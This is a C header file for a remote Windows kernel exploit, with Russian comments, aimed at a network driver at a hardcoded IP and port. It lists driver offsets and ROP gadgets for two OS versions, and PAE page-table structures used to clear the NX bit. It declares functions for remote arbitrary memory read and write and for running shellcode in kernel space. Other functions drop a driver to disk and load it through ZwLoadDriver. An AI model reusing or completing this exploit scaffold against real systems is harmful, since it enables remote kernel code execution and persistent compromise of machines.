#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")
#ifndef _TARGET_H_
#define _TARGET_H_
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <WinSock2.h>
#include <winternl.h>
#include <stdio.h>
#define MAXSOCKETVALUE	10
#define TARGETHOST		"192.168.43.7"
#define TARGETPORT		2222
#define GET_INDEX(diff) \
    ((((diff) - 0x408 - 4) / 4))

#define GET_INDEX_UP(addr, offset) \
    ((((addr) + (offset)) - (addr)) / 4)

#define GET_INDEX_DOWN(addr, offset) \
    ((((addr) - ((addr) - (offset))) / 4) * (-1))

#define PAE_PTE_BASE    0xC0000000
#define GET_PAE_PTE_ADDRESS_FROM_VA(va) ((((ULONG)va & 0xFFFFF000) >> 9) + PAE_PTE_BASE)

typedef enum _RVA_DRIVER {

	rvaToStrQUIT = 0x26B0,
	pStrRegistryPath = 0x25C0,
	rva_CloseSocket = 0x1580,
	rva_Send = 0x1C00,
	rva_Recv = 0x1F30,
	rva_KernelImpAddr = 0x3014,
	rva_NetioImpAddr = 0x300C,

	gad_AddEsp18_PopEdiEsiEbx = 0x2485,
	gad_PopEbp = 0x17A0,
	gad_MovEspEbp = 0x179E,
	gad_ret = 0x17A1,
	gad_retn18 = 0x1A8C,

	//10
	gad_popEcx = 0x22E10,
	gad_movMemEcxEax = 0xED2E2,
	gad_popEax = 0x27094,
	gad_movEaxMemEax = 0x3C806,

	//7
	gad_popEcx7 = 0x1BAF,
	gad_movMemEcxEax7 = 0x25119,
	gad_popEax7 = 0x19551,
	gad_movEaxMemEax7 = 0x41E88,

} RVA_DRIVER;

typedef enum _PTE_FLAG {

	RWbit = 1,
	NXbit = 2,

} PTE_FLAG;

typedef struct _PAEPTE4K {	// 4k PTE страницы PAE

	ULONG P : 1;				// бит присутствия
	ULONG R_W : 1;			// бит разрешения записи
	ULONG U_S : 1;			// бит разрешения доступа пользователя
	ULONG PWT : 1;			// биты управления кэшированием
	ULONG PCD : 1;
	ULONG A : 1;				// бит доступа
	ULONG D : 1;				// бит записи
	ULONG PATi : 1;				// бит расширения размера страницы:4к(0) или 2/4М(1)
	ULONG G : 1;
	ULONG Used : 3;			// Доступно
	ULONG Address : 20;		// физический адрес каталога страниц
	ULONG HighAddress : 4;	// старшие 4 бита адреса (33-36)
	ULONG Zero : 27;
	ULONG Nx : 1;

} PAEPTE, * PPAEPTE, PAEPTE4K, * PPAEPTE4K;

typedef enum _MEMORY_OPERATION {

	READ = 1,
	WRITE = 2,

} MOP;

typedef struct _TARGET_SOCKETS_DRIVER {

	SOCKET first;
	SOCKET second;
	SOCKET tmp[MAXSOCKETVALUE];

} TARGET_SOCK, *PTARGET_SOCK;

typedef struct _TARGET_STACKS_DRIVER {
	
	ULONG first;
	ULONG second;
	ULONG between;

} TARGET_STACK, *PTARGET_STACK;

// вспомогательная структура загруженного PE-файла
typedef struct _PeHeaders {

	PBYTE               mem;            // указатель на память спроецированного файла
	IMAGE_DOS_HEADER* doshead;       // указатель на DOS заголовок
	IMAGE_NT_HEADERS* nthead;        // указатель на NT заголовок
	IMAGE_IMPORT_DESCRIPTOR* impdir;    // указатель на массив дескрипторов таблицы импорта
	DWORD               impdirSize;     // размер таблицы импорта
	DWORD               impdesCount;    // количество элементов в таблице импорта
	IMAGE_EXPORT_DIRECTORY* expdir;    // указатель на таблицу экспорта
	DWORD               expdirSize;     // размер таблицы экспорта
	IMAGE_SECTION_HEADER* sections;  // указатель на таблицу секций (на первый элемент)
	DWORD                   secCount;   // количество секций

} PeHeaders;

typedef struct _KERNEL_MODULE_ {

	PeHeaders pe;
	ULONG base;
	DWORD sizeOfImage;
	const char* name;
	PULONG IAT;
	ULONG IATSize;
	PIMAGE_SECTION_HEADER codeSections;
	ULONG secCount; // количество доступных секций (исполняемых)

} KERNEL_MODULE, * PKERNEL_MODULE;

typedef struct _FUNCTIONS {
	ULONG ExAllocatePool;
	ULONG ExFreePool;
	ULONG ZwCreateFile;
	ULONG ZwClose;
	ULONG ZwWriteFile;
	ULONG RtlCreateRegistryKey;
	ULONG RtlWriteRegistryValue;
	ULONG ZwLoadDriver;
} FUNS;

typedef struct _DRIVER_INFO__TARGET_INFO {
	
	TARGET_STACK stacks;
	TARGET_SOCK socks;
	ULONG DriverBase;
	ULONG KernelBase;
	SOCKET leakSock;
	KERNEL_MODULE kernel;
	KERNEL_MODULE driver;
	USHORT versionOS;
	FUNS fun;

} TARGET_INFO, DRIVER_INFO, *PDRIVER_INFO, *PTARGET_INFO;

// socks
SOCKET ConnectToTarget(PCCH ip, USHORT port);
BOOL SendToTarget(SOCKET sock, LPVOID data, ULONG len);
void CloseAllSockets(PTARGET_SOCK socks);
void CloseMBSockets(PTARGET_SOCK socks);
void CloseSock(SOCKET* sock);
BOOL CloseExploit(IN OUT PDRIVER_INFO info);

// read\write
BOOL TargetRead(IN SOCKET sock, IN int index, OUT LPVOID lpData);
BOOL TargetWrite(IN SOCKET sock, IN int index, IN LPVOID lpData);

// ROP read\wrtie
BOOL InitROP(IN OUT PDRIVER_INFO info);
BOOL MemoryROP(IN PDRIVER_INFO info, IN MOP op, IN ULONG address, IN OUT LPVOID buffer, IN ULONG len);

// PE
BOOL ParsePeImage(PBYTE mem, PeHeaders* pe);
BOOL SearchAllNeededSection(PKERNEL_MODULE mod);
BOOL LoadAllNeededSections(PKERNEL_MODULE mod, PDRIVER_INFO info);
BOOL FindImageBaseByAddr(PDRIVER_INFO info, ULONG addr, LPVOID base);
BOOL LoadPeImage(PKERNEL_MODULE mod, PDRIVER_INFO info, ULONG base);
ULONG FindExportByName(PeHeaders* pe, const char* name, ULONG base);
ULONG FindFreePlaceInSection(PKERNEL_MODULE module, ULONG neededLen);

// ShellCode
BOOL ModPTE(PDRIVER_INFO info, PTE_FLAG bit, ULONG addr, ULONG size, BOOL disable);
BOOL ExecuteCodeSection(PDRIVER_INFO info, PBYTE sc, ULONG size, ULONG addrDst);
BOOL ExecuteStack(PDRIVER_INFO info, PBYTE sc, ULONG size);
void ExecuteCode(PDRIVER_INFO info, PBYTE sc, ULONG size);

// Files
ULONG GetFileBytes(IN OUT PBYTE sc, IN LPCSTR filename);

// Driver
BOOL InitFuns(PDRIVER_INFO info);
BOOL WriteDriver(PDRIVER_INFO info, PBYTE driver, ULONG size,
	PULONG address, SOCKET* sock, PULONG addressSock);
BOOL CreateFileDriver(PDRIVER_INFO info, ULONG address, ULONG addressForSave, ULONG size);
BOOL ExecDriver(PDRIVER_INFO info, ULONG addrForSave);
#endif // !_TARGET_H_
